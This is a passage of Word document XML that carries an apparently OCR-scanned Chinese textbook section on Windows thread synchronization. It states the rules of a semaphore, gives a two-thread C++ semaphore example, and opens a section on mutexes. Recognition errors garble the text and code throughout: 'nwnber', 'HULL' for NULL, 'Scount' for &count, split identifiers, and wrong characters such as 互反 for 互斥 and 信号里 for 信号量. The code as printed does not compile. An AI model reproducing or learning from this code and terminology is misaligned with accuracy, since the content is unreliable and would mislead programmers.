        </w:rPr>
        <w:t>信号量的特点和用途可用下列几句话定义:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(1)如果当前资源的数量大于。，则信号量有效；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(2 )如果当前资源数量是0,则信号量无效</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="995"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="240" w:name="bookmark249"/>
      <w:bookmarkEnd w:id="240"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>系统决不允许当前资源的数量为负值；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="995"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="241" w:name="bookmark250"/>
      <w:bookmarkEnd w:id="241"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当前资源数量决不能大于最大资源数量。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sinclude "stdafx. h"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^include〈windows. h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#i nclude &lt;i ostreajnz</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="80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0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int number = 1; //</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义全局艾里</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>HANDLE hSemaphore; //</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义信号里句柄</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2225"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>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ThreadProcl (void* Ip)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="80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307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>long count;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="307" w:lineRule="exact"/>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line="307" w:lineRule="exact"/>
        <w:ind w:left="11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220" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〃等待</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号里为有信号状态</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Wai tForSingleObj ect (hSemaphore, INFINITE)</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 xml:space="preserve">cout « "thread 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</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++nwnber</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.sleep (100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ReleaseSemaphore (hSemaphore, Scount)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>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315" w:lineRule="exact"/>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tabs>
          <w:tab w:val="left" w:pos="2245"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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ThreadProc2 (void* Ip)</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160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>long count</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>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660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〃等待</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号里为有信号状态</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Wai tForSingleObj ect (hSemaphore, INFINITE)</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 xml:space="preserve">cout « "thread 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</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,Unwnber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.sleep (100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ReleaseSemaphore (hSemaphore, ftcount)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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return 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hSemaphore = Cr e at eS em aphor e (HULL, 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> “sema")</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5" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CreateThreadQTULL, 0, ThreadProcl, NULL, 0, HULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CreateThreadQlULL, 0, ThreadProc2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> NULL, 0, HULL)：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sleep (10*1000)：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>system ("pause")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>土互反星.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="3680"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>采用互反对象机制。只有拥有互乓对象的线程才有访问公共资源的权限，因为互斤对 象只有一个，所以能保证公共资源不会同时被多个线程访问。互斥不仅能实现同一 应用程序的公共资源安全共享，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>还能实现不同应用程序的公共资源安全共享。</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•include "stdafx. h"</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^include〈windows. h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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#include&lt;i ostreajnz</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:headerReference r:id="rId23" w:type="first"/>
          <w:headerReference r:id="rId21" w:type="default"/>
          <w:headerReference r:id="rId22" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1505" w:right="1706" w:bottom="1460" w:left="1688" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:titlePg/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>using namespace std;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="6495"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:hanging="2620"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int number </w:t>
      </w:r>
